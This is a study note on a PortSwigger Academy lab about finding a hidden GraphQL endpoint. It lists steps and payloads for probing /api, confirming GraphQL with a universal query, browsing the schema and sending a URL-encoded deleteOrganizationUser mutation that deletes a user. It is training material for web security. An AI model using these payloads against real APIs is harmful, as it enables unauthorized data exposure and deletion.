# Lab: Finding a hidden GraphQL endpoint

**Official PortSwigger URL:** https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint

**Lab idea:** This challenge involves a GraphQL API that is not apparent from ordinary site navigation and has defenses affecting schema discovery. It practices recognizing GraphQL endpoint behavior and assessing how endpoint discoverability and schema protections shape an authorized API review.

## Vulnerability in brief
GraphQL API vulnerabilities is a topic for learning how to assess GraphQL APIs, not one single vulnerability class. The Academy highlights implementation and design flaws: a GraphQL service commonly exposes multiple operations through one endpoint, while each client request selects fields and can invoke queries or state-changing mutations. If schema exposure, authorization, transport handling, or resource controls are weak, a request may reveal data or trigger actions the caller should not be allowed to perform.

## Solution idea
1. In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.
2. Note that when you send a GET request to /api the response contains a "Query not present" error.
3. Amend the request to contain a universal query.
4. Notice that the response confirms that this is a GraphQL endpoint: { "data": { "__typename": "query" } }
- …
6. In Target > Site map , browse the schema again and find the deleteOrganizationUser mutation.
7. Send the request to Repeater.
8. In Repeater, send a deleteOrganizationUser mutation with a user ID of 3 to delete carlos and solve the lab.

## Payloads / key values
- `/api`
- `/api?query=query{__typename}`
- `{ "data": { "__typename": "query" } }`
- `__schema`
- `"__schema{"`
- `getUser`
- `{ "data": { "getUser": null } }`
- `id`
- `carlos`
- `3`
- `deleteOrganizationUser`
- `/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D`

## Official source
- [PortSwigger Academy: Lab: Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
